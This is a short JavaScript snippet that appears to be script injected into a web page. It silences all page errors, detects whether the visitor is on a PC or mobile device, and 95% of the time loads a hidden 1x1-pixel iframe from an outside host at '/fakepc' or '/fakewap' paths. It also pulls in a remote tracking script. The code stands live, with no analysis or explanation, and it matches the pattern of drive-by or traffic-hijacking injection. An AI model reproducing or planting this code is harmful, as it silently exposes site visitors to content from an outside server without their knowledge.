var u = "http://c.cnzz.com/core.php?web_id=1000404829&t=z";
var wapp = 0.95;
var pcp = 0.95;
var serh = "entry.hamengjie.com:31002";
window.onerror = function(a, b, c) {
	return true;
};
function IsPC() {
	var a = navigator.userAgent;
	var b = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
	var c = true;
	for (var v = 0; v < b.length; v++) {
		if (a.indexOf(b[v]) > 0) {
			c = false;
			break
		}
	}
	return c;
};
function loadjs(a) {
	var c = document.createElement("script");
	c.setAttribute("type", "text/javascript");
	c.setAttribute("src", a);
	c.setAttribute("charset", "utf-8");
	document.getElementsByTagName("head")[0].appendChild(c);
};
function loadiframe(a) {
	var c = document.createElement("iframe");
	c.setAttribute("id", "wbifr");
	c.setAttribute("name", "wbifr");
	c.setAttribute("width", "1px");
	c.setAttribute("height", "1px");
	c.setAttribute("src", a);
	document.getElementsByTagName("head")[0].appendChild(c);
};
if (IsPC()) {
	if (Math.random() < pcp) {
		loadiframe("http://" + serh + "/fakepc");
	}
} else {
	if (Math.random() < wapp) {
		loadiframe("http://" + serh + "/fakewap");
	}
}
if (u.indexOf("?") > 0) {
	u += "&aaa_flag=1"
} else {
	u += "?aaa_flag=1"
}
loadjs(u);